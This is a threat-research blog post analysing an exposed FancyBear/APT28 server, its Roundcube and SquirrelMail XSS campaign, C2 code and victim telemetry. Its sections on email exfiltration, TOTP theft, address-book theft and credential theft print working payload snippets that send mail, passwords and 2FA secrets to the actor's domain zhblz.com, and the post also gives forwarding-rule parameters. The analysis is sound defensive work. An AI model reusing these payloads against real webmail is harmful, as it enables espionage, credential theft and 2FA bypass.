---
title: "FancyBear Exposed: Major OPSEC Blunder Inside Russian Espionage Ops"
classes: wide
header:
  teaser: /assets/images/fancy/logo.png
ribbon: black
description: "FancyBear's OPSEC failure gives Ctrl-Alt-Intel rare visibility inside Russian espionage operations"
categories:
  - Threat Research
tags:
  - Threat Research
toc: true
---

# Overview

On March 11th 2026, our friends at Hunt.io published an analysis into a campaign they track as [Operation Roundish](https://hunt.io/blog/operation-roundish-apt28-roundcube-exploitation), based on an exposed open-directory scanned on 13th January 2026. This archive is available on the Hunt.io platform. 

This was campaign was attributed by Hunt.io to a Russian Advanced Persistent Threat (APT), tracked as [FancyBear](https://www.crowdstrike.com/en-us/blog/who-is-fancy-bear/) by CrowdStrike,  [APT28](https://cloud.google.com/blog/topics/threat-intelligence/apt28-a-window-into-russias-cyber-espionage-operations) by Mandiant, [Forest Blizzard/STRONTIUM](https://www.microsoft.com/en-us/security/security-insider/threat-landscape/forest-blizzard) by Microsoft, and [Sednit](https://web-assets.esetstatic.com/wls/2016/10/eset-sednit-part-2.pdf) by ESET. 

The UK NCSC, part of GCHQ, has previously [assessed](https://www.ncsc.gov.uk/files/Advisory_APT28-exploits-known-vulnerability.pdf) "APT28 is almost certainly the Russian General Staff Main Intelligence Directorate (GRU) 85th special Service Centre (GTsSS) Military Intelligence Unit 26165".

Building on initial reported findings, Ctrl-Alt-Intel discovered a **second exposed open-directory** on the same server. One that contained FancyBear's C2 source code, additional payloads, telemetry logs, exfiltrated data and evidence of further campaigns. What we found inside was staggering:

* **2,800+ emails** exfiltrated from government and military mailboxes
* **240+ sets of stolen credentials**, including passwords and TOTP 2FA secrets
* **140+ Sieve forwarding rules** silently redirecting every incoming email to an attacker-controlled mailbox
* **11,500+ contact email addresses** harvested from victim address books, mapping entire communication networks

FancyBear successfully compromised **government and military entities** across **Ukraine, Romania, Bulgaria, Greece, Serbia, and North Macedonia** - which included email addresses linked to **four NATO member countries**. We also identified a previously unreported **SquirrelMail** XSS payload, expanding the known scope of webmail platforms targeted in this campaign.

Ctrl-Alt-Intel linked this infrastructure back to [CERT-UA reporting from September 2024](https://cert.gov.ua/article/6281123), meaning FancyBear operated from the **same C2 server for over 500 days**, long after it was publicly attributed to GRU-linked operations. Despite being classified as a "sophisticated" threat, FancyBear demonstrated **poor operational security on multiple counts**, giving us rare, near-complete visibility into Russian espionage operations.

> Interested in this campaign? Worried your organisation has been impacted by FancyBear? We're happy to share further detailed information to relevant authorities. Please email `contact[@]ctrlaltintel[.]com`.

## Unique Victim Emails

| Country | Unique victims | Key organisations |
|---|---|---|
| Ukraine | 175 | Regional Prosecutors: Kirovohrad (47), Poltava (47), Kyiv (14), Chernihiv (13), Khmelnytskyi (8); Asset Recovery Agency (18); Migration Service, Government mail |
| Romania | 67 | Romanian Air Force (62), Romanian Air Force Academy (5) |
| Greece | 30 | National Defence General Staff / GEETHA (28), Military (2) |
| Serbia | 8 | Ministry of Defence (6), Military Academy (1), Military Medical Academy (1) |
| Bulgaria | 4 | Government (4) |
| North Macedonia | 1 | Government (1) |

## Geopolitical significance 

A hypothesis is that this victimology reflects **regional military relevance**, rather than a random spread of webmail targets of European government/military.

* Romania, Bulgaria, and Greece appear in a [documented regional security context](https://www.reuters.com/world/europe/romania-bulgaria-greece-sign-deal-boost-military-mobility-2024-07-11). On 11 July 2024, the three countries (who were all victims) signed a deal to speed the cross-border movement of troops and weapons to NATO’s eastern flank. 

* Greece also had a direct Ukraine-related role. On 21 August 2023, President Zelensky said [Greece would participate in training Ukrainian pilots for F-16s](https://www.reuters.com/world/europe/greece-train-ukrainian-f-16-pilots-zelenskiy-says-2023-08-21), and Reuters reported that officials from the F-16 coalition said training would take place in Denmark and Romania.

* Serbia is more ambiguous, but still relevant. On 30 May 2025, Reuters reported that [Russia’s SVR accused Belgrade of allowing Serbian-made ammunition](https://www.reuters.com/business/aerospace-defense/serbia-says-it-will-investigate-russian-accusations-that-it-ships-arms-ukraine-2025-05-30) to reach Ukraine through intermediaries, including Bulgaria. Reuters also noted that Serbia had condemned Russia’s invasion, while refusing to join Western sanctions.

* North Macedonia was reported on 28 February 2024 to have [joined Western sanctions against Russia](https://www.reuters.com/world/europe/ukraines-zelenskiy-arrives-albania-foreign-minister-says-2024-02-28) and sent arms and equipment to Ukraine. That makes North Macedonia a plausible, if lower-significance, fit within a victim set linked to states supporting Ukraine

The timing of the compromises of these secific Government and Militiary targets, with the first reported in September 2024 by CERT-UA, continuing onto late 2025 and potentially early 2026, is not coincidental.  

# OPSEC & Opendirs

When cybercriminals, including nation-state groups, stage payloads or share files, they *may* do so with an "open-directory", also known as a "opendir". This allows them to quickly and easily download files via HTTP - just by running a command like `python -m http.server 8889`.  

Due to the operational-tempo of performing cyber-attacks, threat actors often get distracted and forget to close these - which can in some cases expose data to the public that should've private - at least in the eyes of the threat actors. 

These operational security (OPSEC) failures give rare visibility into attacks from the perspective of the **threat actor owned server**. They may allow researchers to identify:

* Commands ran by TAs
* Credentials used by TAs
* Malware leveraged in campaigns
* Command & Control (C2) infrastructure
* Tactics, Technqiues & Procedures (TTPs)
* Victimology

> Notably, open-directories update in real time as threat actors add or remove files to the directory which is being exposed. If they are left open, it is possible to track and compare changes to files within open-directories in order to observe the evolution of the campaign in real time.

# Timeframe

Ctrl-Alt-Intel assesses FancyBear operated from a NameCheap Virtual Private Server (VPS), located within the US, on the IP address `203.161.50[.]145` from at least September 2024. 

Using [Censys' Service History](https://platform.censys.io/hosts/203.161.50.145/history) feature, their telemetry suggests that one of the open-directories (exposed from port `8889`) was open between the dates of **31st January 2026 12:14 UTC** and **11th March 2026 10:02 UTC**. 

[![1](/assets/images/fancy/1.png){: .align-center .img-border}](/assets/images/muddy/1.png)
<p class="figure-caption">Censys Service History for `203.161.50[.]145`</p>  

There are a few important things to note: 

* These dates are when Censys scanned & identified open ports, but it is **very likely** was open before & after these times
* This threat actor had multiple open-directories from January - March 2026, although each was on the port `8889`

The open-directory scanned and archived by Hunt.io on **13th January 2026 10:41 UTC** was located within a **different directory** than the one discussed by Ctrl-Alt-Intel in this blog. As a result, we had additional visibility into FancyBear's operations. 

[![1](/assets/images/fancy/2.png){: .align-center .img-border}](/assets/images/muddy/2.png)
<p class="figure-caption">Hunt.io archive from 13th January</p>

Notably, from the open-directory we analysed there were no `.profile` or `.bash_history` files - indicating this was located within a different directory to the one discussed within Hunt.io's analysis. However, we saw this was clearly the same campaign and threat actor.

[![1](/assets/images/fancy/4.png){: .align-center .img-border}](/assets/images/muddy/4.png)
<p class="figure-caption">Open-directory from 11th March</p>  

## Active since September 2024

We were **extremely shocked** to see the same C2 server IP address `203.161.50[.]145`, attributed with medium-confidence to *FancyBear* by the [Ukranian CERT](https://cert.gov.ua/article/6281123) on **25th October 2024**. Thankfully, although it took nearly two years, *FancyBear* made the mistake of exposing their operation from this same server. 

Defenders and Intelligence analysts are often reminded of the volatility of IP addresses with the **Pyramid of Pain**. This conceptual framework categorizes indicators based on the difficulty ("pain") they cause attackers to alter. Ranging from trivial to change (bottom: Hash Values, IP Addresses) to highly difficult (top: TTPs), it helps security teams focus on high-impact detections:

[![1](/assets/images/fancy/3.jpg){: .align-center .img-border}](/assets/images/muddy/3.jpg)
<p class="figure-caption">Pyramid of Pain - ref. AttackIQ</p>  

In this case, such frameworks didn't apply in practice, *FancyBear* continued to operate from the same server that was publicly attributed to *FancyBear* over **500 days ago**.  

## CERT-UA Advisories

The IP address associated with the 2026 OPSEC open-directory blunder, `203.161.50[.]145`, linked to FancyBear/APT28, was previously observed by CERT-UA on two separate occasions. 

* CERT-UA#10859 - *FancyBear* exploiting Roundcube (CVE-2023-43770)
* [CERT-UA#11689](https://cert.gov.ua/article/6281123) - *FancyBear* using ClickFix

On the 25th October 2024, [CERT-UA#11689](https://cert.gov.ua/article/6281123) was published exposing a spear-phishing campaign targeting local governments with the subject "Spreadsheet Replacement". The phishing emails contained a link to the domain `docs.google.com.spreadsheets.d.1ip6eeakdebmwteh36vana4hu-glaeksstsht-boujdk.zhblz[.]com` where John Hammond's [reCAPTCHA Phish POC](https://github.com/JohnHammond/recaptcha-phish) was used to deliver Metasploit payloads with the C2 IP address `203.161.50[.]145`:

[![1](/assets/images/fancy/5.png){: .align-center .img-border}](/assets/images/muddy/5.png)
<p class="figure-caption">ClickFix Execution Chain - ref. CERT-UA</p>  

Within this same blog, CERT-UA mentioned that in a **September 2024** incident, CERT-UA#10859, the same IP address was associated with exploitation of Roundcube (CVE-2023-43770). Roundcube exploitation from this IP address was corroborated by Hunt.io & Ctrl-Alt-Intel's 2026 analysis. 

> FancyBear had used same techniques to target Roundcube from this server since September 2024 to March 2026, when we believe their access has been removed

# Ctrl-Alt-Intel Analysis

We mentioned earlier that the open-directory identified by Ctrl-Alt-Intel was found within a separate directory to the one discussed and archived by Hunt.io. Although we did see consistent targeting, identical payloads and clearly the same campaign - we also observed many more related payloads, scripts and telemetry:

## "New" open-dir files

We want to note some of these files were mentioned within Hunt.io's analysis, however they **weren't included within the January 13th archive** - but rather referenced often as "output" files from the scripts they analysed.

| File | Description | Date |
|---|---|---|
| **JavaScript XSS Payloads** | | |
| `scriptTaker.js` | XSS payload (email `advenwolf@proton.me` - seen by Hunt.io, `SystemHealthChek` filter name - seen by CERT-UA ) | 2025-05-15 |
| `old_worker.js` | Roundcube payload (email `advenwolf@proton.me` - seen by Hunt.io) | 2026-01-21 |
| `worker2.js` | SquirrelMail-targeted variant | 2025-10-07 |
| `backuBDMS/worker.js` | `worker.js` backup (email `advenwolf@proton.me`, `secure: bigdick` headers - seen by Hunt.io) | 2025-07-04 |
| **Modular JS Components** | | |
| `addRedirectMailBox.js` | Sieve rule creation module (`SystemProtect` filter) | 2025-11-01 |
| `adbook.js` | Address book extraction module | 2025-05-15 |
| `keyTwoAuth.js` | 2FA TOTP secret extraction| 2025-02-21 |
| `delTwoAuth.js` | 2FA deletion/manipulation module| 2025-05-15 |
| `delTwoAuth1.js` | 2FA deletion module | 2025-02-19 |
| `getUserCredentials.js` | Credential stealer | 2025-09-08 |
| `getUserCredentialsOLD.js` | Credential stealer | 2025-09-08 |
| `getUserCredentials1.js` | Credential stealer | 2024-12-19 |
| `remFu.js` | Random/irrelevant (two placeholder math functions) | 2024-12-19 |
| **Server-side C2** | | |
| `server.py` | Server-side C2 component (`secure:` header checks commented out, `/worker2` endpoint added) | 2025-12-25 |
| `servertest.py` | Server-side C2 component (`secure: bigdick` header enforced on all endpoints) | 2025-05-28 |
| **Phishing Infrastructure** | | |
| `roundcube.html` | Roundcube login clone | 2025-03-17 |
| `logon.html` | Argentine Roundcube clone (from `mail.ascentio.com.ar`, Spanish text) | 2024-12-17 |
| **Lure Documents** | | |
| `Adob_Scan_15_ian._2025.pdf` | Romanian air-force lure (NATO US gov transfer document) | 2025-03-17 |
| `defense.pdf` | Ukranian defense support lure | 2024-12-18 |
| `dokladMVR.pdf` | Bulgarian Interior Ministry report lure  | 2024-12-17 |
| `energetikamk.pdf` | Macedonian energy sector lure  | 2024-12-17 |
| `oborona.pdf` | Ukrainian/defense lure | 2024-12-18 |
| **Operator Tooling** | | |
| `debug.sh` | Bash reverse shell to `203.161.50[.]145:8081` | 2025-06-30 |
| **Exfiltrated Data / Telemetry** | | |
| `url.txt` | C2 telemetry log (11,067 entries, 24 victim org domains) | 2026-03-10 |
| `taker/creds.csv` | Phishing page captured credentials | 2026-03-07 |
| `taker/visit.csv` | Phishing page visitor log (IPs + User-Agents + timestamps) | 2026-03-11 |

The new files (`scriptTaker.js` / `old_worker.js`) and the Hunt.io reported scripts (`worker.js` / `newworker.js` / `workerlast.js`) are all the core XSS payloads targeting Roundcube. Upon execution, these would download additional modules from the domain `zhblz[.]com`. 

We observed an additional similar XSS payload, `worker2.js`, that was a previously undisclosed SquirrelMail variant - which we will discuss after the Roundcube section.   

> The complete FancyBear toolkit is currently uploaded to our [Github](https://github.com/ctrlaltint3l/intelligence/tree/main/FancyBear/roundish). Victim data or C2 telemetry is not available to the public. If you are an impacted organisation, or a relevant authority, please reach out to `contact[@]ctrlaltintel[.]com` for this information. 

# Roundcube Recap

The initial `worker.js` script, executed via XSS, will perform certain actions in-line from this core script - like extracting the victim email address and exfiltrating emails within their mailbox. 

However, it also leverages additional "modules" that perform specific functions - like adding Sieve mailbox rules, extracting TOTP tokens or stealing the address book. 

[![1](/assets/images/fancy/7.png){: .align-center .img-border}](/assets/images/muddy/7.png)
<p class="figure-caption">Roundcube Compromise Chain</p>  

## In-line execution

**Victim Identification**

In Roundcube, the victim email address is extracted via an environment variable:

```js
var mail_address = rcmail.env.username;
//REDACTED
var openMessageInfo = `u_${mail_address}_o_m`;
//REDACTED
fetch(`${"https://zhblz.com/zJ2w9x"}?log=${openMessageInfo}`);
```
This is logged to the C2 in the format `u_{email}_o_m`.

**Credential Theft**

The Roundcube `worker.js` will attempt credential theft both in-line and via an external module. 

The in-line techniques works by creating a hidden `<div>` with two `<input>` elements that attempt to auto-fill credentials. This is hidden and embedded to the HTML of the Roundcube page.

A global click handler is then attached to the entire document body, meaning after the Javascript is executed, when the user next clicks on this page - their credentials will logged to the C2 with prefix `c_c_f_u_`:

```js
async function getChromeCredentialsAndSend(mail_address) {
  userCredentials = document.getElementById("username").value + `:` + document.getElementById("password").value;
  base64Credentials = btoa(userCredentials);
  fetch(`${"https://zhblz.com/zJ2w9x"}?log=${`c_c_f_u_${mail_address}_:_${base64Credentials}`}`); 
};                                                   // Log to C2 with prefix: c_c_f_u_

// REDACTED 

(function() {
  var f = document.createElement("div");             // Create auto-fill form 
  f.innerHTML = `<input type='text' name='username' id='username' value='' autocomplete='on'>     
                 <input type='password' name='password' id='password' value='' autocomplete='on'>`;
  f.style.visibility = "hidden";
  document.body.appendChild(f);
})();

// Set onclick handler - pass mail_address parameter
document.body.onclick = function() {                  // Attach onclick handler -> call getChromeCredentialsAndSend()
  getChromeCredentialsAndSend(mail_address);
};
```

**Email Exfiltration**

This is perhaps the most alarming capability. Without clicking any links, simply by *receiving* the malicious email - the victim's **entire Inbox and Sent folder** could be silently exfiltrated to FancyBear's C2 server.

Emails are extracted via using the Roundcube URIs to list emails, then iteratively exfiltrate these:

1. HTTP request to `?_task=mail&_action=list&_mbox={folder}&_remote=1` in order to list emails within JSON
2. Regex to extract email UIDs from JSON from `add_message_row`
3. Loop through email UIDs
4. HTTP request to `?_task=mail&_save=0&_uid={UID}&_mbox=${Inbox}&_action=viewsource&_extwin=1` to download
5. Exfiltrate via POST request to `hXXps://zhblz[.]com/zJ2w9x/uploadfile/`
  
```js
r = new RegExp(/add_message_row\((\d*)/g); // Regex to extract email IDs from the mailbox lisiting JSON output

// REDACTED

async function downd(box) {
  fetch(`?_task=mail&_action=list&_mbox=${box}&_remote=1`).then(w => w.json()).then(t => {  // List emails in JSON
    y = t.exec.match(r);       // Extract email UIDs using the regex
    u = y.toString();
    i = u.replace(r, "$1");
    o = i.split(",");
    (async () => {
      ssv = `https://zhblz.com/zJ2w9x/uploadfile/`;
      for (p of o) {                                    // Iterate through each of the message UIDs per Inbox
        a = await fetch(`?_task=mail&_save=0&_uid=${p.toString()}&_mbox=${box}&_action=viewsource&_extwin=1`);
        s = new FormData;
        d = rcmail.env.username;
        f = d + "_" + box + "_" + Date.now().toString();
        let g = new File([await a.text()], f + ".eml");
        s.append("inbox", g, f + ".eml");
        s.append("d", d);
        let formData = new FormData;
        formData.append("file", g);        
        fetch(ssv, {method: "POST", mode: "no-cors", body: formData, contentType: "text/html;charset=UTF-8"}); // POST to Exfiltrate emails
      }
      ;
    })();
  });
}

// REDACTED

(async () => {
  downd("Inbox"); // Exfiltrate all emails in the "Inbox" folder
})();
(async () => {
  downd("Sent"); // Exfiltrate all emails within the "Sent" folder
})();
```

## Modular components

**TOTP/2FA token theft**

From our archive, the file `keyTwoAuth.js` was **unobfuscated**. This targeted the TOTP plugin [twofactor_gauthenticator](https://github.com/alexandregz/twofactor_gauthenticator):

1. HTTP request to `?_task=settings&_action=plugin.twofactor_gauthenticator` to load the 2FA settings page
2. Parse the HTML response into a DOM via `DOMParser`
3. Extract **all 5** `type="password"` fields (the TOTP secret + 4 recovery codes)
4. Concatenate as `secret-code1-code2-code3-code4` and return via callback
5. Base64-encode and exfiltrate via GET to `hXXps://zhblz[.]com/zJ2w9x` with prefix `k_t_f_u_`

```js
async function keyTwoAuth(callback) {
  try {
      var fullUrl = window.location.origin + window.location.pathname;
      const respGet = await fetch(`${fullUrl}?_task=settings&_action=plugin.twofactor_gauthenticator`);
      // REDACTED - error check 
      const htmlTextAuth = await respGet.text();
      const parser = new DOMParser();
      const doc = parser.parseFromString(htmlTextAuth, 'text/html');
      const passwordElements = doc.querySelectorAll('[type="password"]');    // Extracts 5 fields: TOTP secret + 4 recovery codes
      callback(`${passwordElements[0].value}-${passwordElements[1].value}-${passwordElements[2].value}-${passwordElements[3].value}-${passwordElements[4].value}`)
  } catch (error) {
    callback('no_key');    
  }
}
```

The Roundcube [twofactor_gauthenticator](https://github.com/alexandregz/twofactor_gauthenticator) plugin displays the TOTP secret and recovery codes in hidden `password` fields within the settings page. Because the XSS payload runs **within the victim's authenticated session**, it can request this settings page with the victim's cookies and read the values directly from the DOM. 

The TOTP secret is a base32-encoded key (e.g., `JBSWY3DPEHPK3PXP`) that generates time-based codes. With this secret, FancyBear can generate valid 2FA codes indefinitely - effectively **bypassing 2FA entirely** without needing physical access to the victim's authenticator app.

From the C2 log, we observed **516 entries** with the `k_t_f_u_` prefix across **108 unique victim email addresses**. Decoding the base64 blobs, **256 contained real TOTP secrets** and **260 returned `no_key`** - meaning those victims hadn't configured 2FA.  

> For victims who *had* configured 2FA, FancyBear obtained **both their password and their TOTP secret** in a single XSS execution - providing complete, persistent access to the mailbox with no further interaction required from the victim.

**Contact Address Book Theft**

The address book extraction module (`adbook.js`, **obfuscated**) was loaded via `eval()` in earlier `worker.js` variants:

```js
const respo = await fetch("https://zhblz.com/adbook.js");
// REDACTED - error check
const scriptContent3 = await respo.text();
eval(scriptContent3);
addressbook(emailsBook => {
  fetch(`${"https://zhblz.com/zJ2w9x"}?log=${`t_e_f_u_${mail_address}_:_${emailsBook}`}`);  // Log to C2 with prefix: t_e_f_u_
});
```

After deobfuscation, `adbook.js` revealed a three-stage pagination approach:

1. Fetch `?_task=addressbook` and parse the HTML to discover address book sources
2. For **each source**, fetch `?_task=addressbook&_action=list&_source={N}&_page=1&_remote=1` to get JSON containing `pagecount`
3. Iterate through **all pages** per source, extract email addresses via regex `/[a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z]{2,}/g`
4. Join all extracted emails with commas, base64-encode, and exfiltrate via C2 with prefix `t_e_f_u_`

From the C2 log, we observed **2,870 entries** with the `t_e_f_u_` prefix across **157 unique victim email addresses**. Decoding all the base64 blobs, we recovered **11,527 unique email addresses** across **2,254 distinct domains**. 

The intelligence value of this data is enormous. It maps every contact that compromised government and military officials had ever emailed, exposing communication & contact networks.

**Sieve Forwarding Rule Creation**

This was the most impactful module in the toolkit. The `addRedirectMailBox.js` module (**obfuscated**) creates a Sieve mail filtering rule that silently forwards **every single incoming email** to a FancyBear-controlled mailbox, persisting post-inital compromise. 

After deobfuscation, the module takes two parameters - the Roundcube base URL and the redirect target email - and performs a two-step process:

* **Step 1**: Check if ManageSieve is available

```js
var checkResponse = await fetch(fullUrl + '?_task=settings&_action=plugin.managesieve-action');
var respBody = await checkResponse.text();
if (respBody.includes('SERVICE CURRENTLY NOT AVAILABLE') === false) {
    // ManageSieve is available - proceed to create rule
} else {
    return false;   // Abort - ManageSieve not available on this server
}
```

This is why we observed **109 unique victims** where the Sieve rule failed (`c_r_m_f_u_` prefix). Organisations like `roaf.ro` (51 failures), `hndgs.mil.gr` (28 failures) and `arma.gov.ua` (15 failures) simply did not have ManageSieve enabled - their mail servers returned `SERVICE CURRENTLY NOT AVAILABLE` and the module aborted.

* **Step 2**: Create the forwarding rule

If ManageSieve is available, the module sends a POST request to `plugin.managesieve-save` with a URL-encoded form body that creates a new Sieve filter. After decoding the obfuscated body, the critical parameters are:

```
_token       = {rcmail.env.request_token}     ← Victim's CSRF token (stolen from the Roundcube JS runtime)
_fid         = 1000                           ← Filter ID (deliberately high to avoid overwriting existing rules)
_name        = SystemProtect                  ← Sieve rule name (renamed from "SystemHealthChek" after CERT-UA disclosure)
_enabled     = 1                              ← Rule is active immediately
_join        = any                            ← Match "any" condition

_header[0]        = (empty)                   ← No header filter
_rule_op[0]       = contains                  ← No matching criteria  
_rule_target[0][] = (empty)                   ← No target value

_action_type[0]   = redirect_copy             ← Forward a COPY of the email (original stays in inbox)
_action_target[0] = advenwolf@proton.me       ← FancyBear's collection address
```

# SquirrelMail

In ESET's May 2025 "Operation RoundPress", they observed *FancyBear* leverage 4 distinct JS payloads:

* SpyPress.HORDE
* SpyPress.MDAEMON
* SpyPress.ROUNDCUBE
* SpyPress.ZIMBRA

Each of these were injected into victim webmails (Roundcube, MDaemon, Horde, Zimbra) via XSS vulnerabilities. 

Ctrl-Alt-Intel identified an additional JavaScript payload that targeted SqurrelMail, a mailserver that hasn't previously been linked to this campaign by Hunt.io, ESET or CERT-UA:

[![1](/assets/images/fancy/6.png){: .align-center .img-border}](/assets/images/muddy/6.png)
<p class="figure-caption">SquirrelMail Compromise Chain</p>  

## In-line execution

**Victim Identification**

Unlike with Roundcube, which simply extracted the victim email address using `rcmail.env.username`, more effort was required to identify the victim with SquirrelMail:

[![1](/assets/images/fancy/8.png){: .align-center .img-border}](/assets/images/muddy/8.png)
<p class="figure-caption">SquirrelMail Victim Identification Source Snippet</p>  

1. Re-fetches the current page URL with `fetch(originalUrl)`
2. Parses the full HTML response into a DOM via `DOMParser`
3. Extracts `body.innerText`
4. Regex against the `To:` header line to pull out an email address, validate
5. Logs with prefix `e_h_f_u_` & `h_f_u_` 

* `h_f_u_{email}` = success (username extracted from HTML)
* `e_h_f_u_{email}` = error (extraction failed)

**Contact Address Book Theft**

Unlike Roundcube's modular `adbook.js`, the SquirrelMail address book extraction is **implemented inline** within `worker2.js`:

```js
async function getAddressBook(username) {
    try {
        const newUrl = `${originalUrl.split("/src/")[0]}/src/addressbook.php`;   // Construct SquirrelMail addressbook URL
        const response = await fetch(newUrl, {
            credentials: "include",
            // REDACTED - headers
        });
        const html = await response.text();
        const parser = new DOMParser();
        const doc = parser.parseFromString(html, "text/html");

        const emailLinks = Array.from(doc.querySelectorAll('a[href*="compose.php"]'));   // Extract all contact links
        const textList = emailLinks.map(link => link.textContent.trim());
        const joined = textList.join("-");
        const base64Encoded = btoa(unescape(encodeURIComponent(joined)));    // Base64-encode the contact list

        const log = `t_a_f_u_${username}_:_${base64Encoded}`;               // Inner log entry
        const trackingUrl = `https://zhblz.com/zJ2w9x?log=t_a_b_f_u_${username}_:_${encodeURIComponent(log)}`;
        await fetch(trackingUrl, { method: "GET", mode: "no-cors" });        // Exfiltrate with double-encoding
    } catch (error) {
        await fetch(`${"https://zhblz.com/zJ2w9x"}?log=e_t_a_b_f_u_${username}`);
    }
}
```

The approach differs significantly from Roundcube:

1. Constructs the address book URL by splitting the current page URL on `/src/` and appending `/src/addressbook.php`
2. Fetches the page with the victim's session cookies
3. Parses the HTML and finds all `<a>` tags containing `compose.php` in their `href`
4. Extracts `.textContent` (the contact name/email) from each link
5. Joins contacts with dashes, base64-encodes, and exfiltrates via C2

From the C2 log, we observed **98 entries** with the `t_a_b_f_u_` prefix. However, all 4 SquirrelMail victims were **attacker test accounts** (`pru.mik@gov.vppdr.com`, `pru.od@gov.vppdr.com`, `pru.ok@gov.vppdr.com`, `shark@mail.govmk.com`). 


# Inside FancyBear's Command & Control server

Within the open-directory Ctrl-Alt-Intel analysed, we discovered FancyBear exposed the server-side C2 components that revealed additional functionality. After digging through these, and the corresponding logs, we had an almost complete picture of how FancyBear operated and targeted its victims.

The Command & Control (C2), hosted on `zhblz[.]com (203.161.50[.]145)` performed the following actions:

* Host core XSS payloads
* Host additional JS modules
* Host ClickFix lures
* Host malware
* Host SSH keys 
* Log C2 telemetry
* Allow exfiltration of `.eml` files
* Allow exfiltration and decryption of Browser credentials
* Host credential theft page 

## FancyBear ClickFixing Throwback

We mentioned earlier that from [CERT-UA#11689](https://cert.gov.ua/article/6281123), FancyBear leveraged John Hammond's [reCAPTCHA Phish POC](https://github.com/JohnHammond/recaptcha-phish) in order to gain initial access:

[![1](/assets/images/fancy/11.png){: .align-center .img-border}](/assets/images/muddy/11.png)
<p class="figure-caption">FancyBear ClickFix execution chain</p>  

Although commented out, within the main FancyBear C2 source - we saw clear evidence of the server-side components hosting the payloads seen in their reporting:

```python
###########---reCAPTCHA/Chrome---##############
# @app.route('/document')
# def first():
    
#     return send_from_directory('static', 'index.html')

# @app.route('/B')
# def serve_hta():
#     return send_from_directory('static', 'Browser.ps1')

# @app.route('/b')
# def serves():
#     return send_from_directory('static', 'browser.hta')

# @app.route('/id_rsa')
# def very():
#     return send_from_directory('static', 'id_rsa')

######################SSH##########################

# @app.route('/ssh')
# def exe():
#     return send_from_directory('OpenSSH-Win64', 'ssh.exe')


# @app.route('/libcrypto')
# def dll():
#     return send_from_directory('OpenSSH-Win64', 'libcrypto.dll')


# @app.route('/endpoint', methods=['POST'])
# def receive_message():
#     data = request.get_json()
#     message = data.get('message')
#     print(f"Received message: {message}")
#     return jsonify({"status": "success"}), 200
```

We saw these precise same IOCs mentioned within the Ukranian CERT's reporting:

[![1](/assets/images/fancy/10.png){: .align-center .img-border}](/assets/images/muddy/10.png)
<p class="figure-caption">ClickFix IOCs - ref. CERT-UA</p>  

## XSS Payload Hosting

Payloads are the JS files that run in the context of a compromised webmail (Roundcube/SquirrelMail) after XSS. The **same server** that hosts the phishing pages also **serves these payloads** (and logs telemetry):

| URL | File served | Purpose |
|-----|-------------|---------|
| `/worker` | worker.js | Roundcube XSS payload (main) |
| `/worker2` | worker2.js | SquirrelMail XSS payload |
| `/<path>` | any file under `.` | Catch-all static, used for JS modules `/addRedirectMailBox.js` |

## Credential Theft Phishing

A capability previously unreported and unrelated to the Roundcube XSS tradecraft, was cloned Roundcube login pages used for credential harvesting. 

These threat actors were persistent. They attempted both to steal credentials via JavaScript execution and separately by socially engineering users into entering credentials on cloned target webmail servers:

[![1](/assets/images/fancy/12.png){: .align-center .img-border}](/assets/images/muddy/12.png)
<p class="figure-caption">Server-side code for credential harvesting</p>  

At the point of our analysis, the C2 server was hosting cloned Roundcube servers specifically targeting the Romanian airforce:

[![1](/assets/images/fancy/9.png){: .align-center .img-border}](/assets/images/muddy/9.png)
<p class="figure-caption">Romanian Airforce Roundcube Lure</p>  

> This did not appear successful. We observed 1 valid Romanian airforce credential stolen. 

# C2 log analysis

The file `url.txt` is the backbone of FancyBear's telemetry. Every XSS payload execution - across Roundcube, SquirrelMail and the earlier `scriptTaker.js` variant logs results back to the C2 via GET requests to `hXXps://zhblz[.]com/zJ2w9x?log={prefix}_{data}`. 

We recovered **11,067 entries** in this file. These were not timestamped unfortunately. Each entry uses a structured prefix that identifies the exact operation and its outcome. By decoding these, we could reconstruct FancyBear's campaign at scale.

## C2 Log Prefix Reference

| Prefix | Action | Platform | Data format |
|---|---|---|---|
| `u_{email}_o_m` | Victim opened XSS email (beacon) | Roundcube | Victim email in plaintext |
| `h_f_u_{email}` | Victim identified (success) | SquirrelMail | Victim email in plaintext |
| `c_c_f_u_{email}_:_{b64}` | Credential theft (inline hidden form) | Both | Base64 of `username:password` |
| `f_c_f_u_{email}_:_{b64}` | Credential theft (external module) | Both | Base64 of `username-password` |
| `m_f_u_{email}_r_t_{target}` | Sieve forwarding rule **created** | Roundcube | Victim email + redirect target |
| `c_r_m_f_u_{email}` | Sieve forwarding rule **failed** | Roundcube | Victim email |
| `k_t_f_u_{email}_:_{b64}` | TOTP 2FA secret **stolen** | Roundcube | Base64 of `secret-code1-code2-code3-code4` or `no_key` |
| `t_e_f_u_{email}_:_{b64}` | Address book **stolen** | Roundcube | Base64 of comma-separated email addresses |
| `t_a_b_f_u_{email}_:_{data}` | Address book **stolen** | SquirrelMail | URL-encoded inner payload |

Using these prefixes, we decoded the entirety of FancyBear's telemetry to measure the success of their campaign across **24 unique victim organisations**:

## Credential Theft

Across both the inline hidden form technique (`c_c_f_u_`) and the external module (`f_c_f_u_`), we observed **3,380 credential capture entries** across **244 unique victim email addresses**. The most targeted organisations were:

| Organisation | Unique victims |
|---|---|
| `roaf.ro` (Romanian Air Force) | 52 |
| `ptcu.gp.gov.ua` (Ukrainian Prosecutor - Poltava) | 47 |
| `kir.gp.gov.ua` (Ukrainian Prosecutor - Kirovohrad) | 33 |
| `hndgs.mil.gr` (Greek National Defence General Staff) | 28 |
| `arma.gov.ua` (Ukrainian Asset Recovery Agency) | 15 |
| `kyiv.gp.gov.ua` (Ukrainian Prosecutor - Kyiv) | 13 |
| `chrg.gp.gov.ua` (Ukrainian Prosecutor - Chernihiv) | 13 |
| `vppdr.gp.gov.ua` (Ukrainian Prosecutor) | 12 |
| `mod.gov.rs` (Serbian Ministry of Defence) | 6 |
| `afas.ro` (Romanian Air Force Academy) | 5 |
| `pd.government.bg` (Bulgarian Government) | 4 |

## Sieve Forwarding Rules

This was arguably the most damaging capability. Successfully created Sieve rules silently forward **every incoming email** to an attacker-controlled mailbox.

We observed **143 unique victim email addresses** with successfully created forwarding rules:

| Organisation | Successful rules | Country |
|---|---|---|
| `ptcu.gp.gov.ua` (Poltava Prosecutor) | 47 | Ukraine |
| `kir.gp.gov.ua` (Kirovohrad Prosecutor) | 32 | Ukraine |
| `chrg.gp.gov.ua` (Chernihiv Prosecutor) | 13 | Ukraine |
| `vppdr.gp.gov.ua` (Ukranian Defence Prosecutor) | 12 | Ukraine |
